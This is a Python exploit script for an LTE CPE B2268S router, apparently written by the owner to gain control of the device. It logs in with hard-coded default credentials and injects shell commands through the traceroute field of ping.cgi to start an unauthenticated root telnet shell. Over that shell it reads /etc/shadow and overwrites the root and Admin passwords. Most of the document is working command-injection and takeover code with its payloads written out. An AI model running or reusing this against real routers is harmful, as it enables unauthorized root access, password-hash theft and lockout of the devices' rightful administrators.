#!/usr/bin/env python3

########################################################################################################
#
# LTE CPE B2268S Router
# version: V100R001C35SP100B529
#
# Busybox Command Injection, vulnerability in the traceroute command
#
# Payload: 
# data = {
#   'authToken': token, <= retrieved by get_token() method
#   'ping': '2', => traceroute
#   'IPaddress': '0.0.0.0 ;telnetd -l/bin/sh #',
# } POST => ping.cgi
#
# the "telnetd -l/bin/sh" cmd opens a shell without loging in when connecting
# with telnet: telnet 192.168.1.1 23 => shell
# Spend most of time trying to shorten the payload as it seems to be truncated
# after x amount of characters.
#
# This corporate fuckery is insane, they sell you something you can't
# control, even the most basic stuff
#
# This is what helped the most:
# https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2010/february/busybox-command-injection/
#
########################################################################################################

import requests
import telnetlib
import time
import re
import base64

from requests.packages.urllib3.exceptions import InsecureRequestWarning

VERBOSE = False

PROMPT   = '# '
ePROMPT  = PROMPT.encode('ascii')

HOST     = '192.168.1.1'
base     = 'https://{}/'.format(HOST)
login    = 'login.cgi'
index    = 'indexMain.cgi'
ping     = 'ping.cgi'

user     = 'User'
password = 'LTEcpe'

# Stage 1 payload: gaining access
s1_payloads = [
    '0.0.0.0 ;pkill telnetd #',
    '0.0.0.0 ;telnetd -l/bin/sh #',
    '0.0.0.0 ;ps l|grep telnetd #'
]

###################################
# Payload examples:
#
# '0.0.0.0 ;ps l #'
# '0.0.0.0 ;ps l|grep telnetd #'
# '0.0.0.0 ;pkill telnetd #'
# '0.0.0.0 ;telnetd -l/bin/sh #'
#
###################################

# Stage 2 payloads: maintaining access
s2_payloads = [
    #'cp /tmp/shadow /etc/shadow',
    'false | cp -i /etc/shadow /tmp/shadow 2>/dev/null',
    'cat /etc/shadow',
    [
        'chpasswd',
        'root:admin',
        ''
    ],
    [
        'chpasswd',
        'Admin:Admin',
        ''
    ],
    'cat /etc/shadow',
    'exit'
]


session = requests.session()


def get_token(page):

    res = session.get(base + page, verify=False)
    matches = re.findall('<input type="hidden" id="authToken" name="authToken" value="(.{64})"/>', res.text)
    return matches[0]


def exec_telnet(tn, line, till=PROMPT):

    line = line + '\n'
    tn.write(line.encode('ascii'))
    data = b'' 
    while data.decode('ascii').find(till) == -1:
        try:
            data += tn.read_very_eager()
        except EOFError as e:
            print('Connection closed: %s' % e)
            break
    if data != b'':
        if VERBOSE:
            print(data.decode('ascii'))


def exec_login():

    print('Logging in..')

    authToken = get_token(login)

    salt_password = base64.b64encode(password.encode('utf-8'))
    salt = authToken
    salt_password = salt + salt_password.decode('utf-8')
    encrypt_password = base64.b64encode(salt_password.encode('utf-8'))

    # logining in
    data = dict({
        'authToken': authToken,
        'UserName': 'User',
        'password': encrypt_password,
        'hiddenPassword': encrypt_password,
        'submitValue': '1'
    })
    res = session.post(base + login, data=data, verify=False)

    # redirecting
    data = dict({
        'submitValue': '0'
    })
    res = session.post(base + index, data=data, verify=False)

    print('Logged in!')


def exec_s1_payloads():

    print('Gaining access..')

    for s1_payload in s1_payloads:

        authToken = get_token(ping)

        data = dict({
            'authToken': authToken,
            'ping': '2',
            'IPaddress': s1_payload,
        })
    
        res = session.post(base + ping, data=data, verify=False)
        matches = re.findall('<textarea name="LineInfoDisplay" align="left" cols="100%" rows="15" readonly >([\s\S]*)</textarea>', res.text)
        if VERBOSE:
            print('Output:')
            print('=' * 20)
            print(matches[0])
            print('=' * 20)

    print('Reverse shell opened!')


def exec_s2_payloads():

    print('Opening a telnet shell..')

    tn = telnetlib.Telnet(HOST)
    try:
        res = tn.read_until(ePROMPT, timeout=5)
    except EOFError as e:
        print('Connection closed: %s' % e)
    if res == ePROMPT:
        print('Connected to reverse shell!')
        print('Executing payloads..')
        for s2_payload in s2_payloads:
            if isinstance(s2_payload, list):
                if len(s2_payload) < 2:
                    print('Error in promted cmd!')
                    break
                list(map(lambda line: exec_telnet(tn, line, ''), s2_payload[:-1]))
                exec_telnet(tn, s2_payload[-1])
            else:
                exec_telnet(tn, s2_payload)

        print('Done executing payloads!')
        print('New Credentials:')
        print('root:admin')
        print('Admin:Admin')


def main():

    print('Preparing payload execution env..')

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    exec_login()
    exec_s1_payloads()
    exec_s2_payloads()

    print('Done!')

if __name__ == '__main__':
    main()
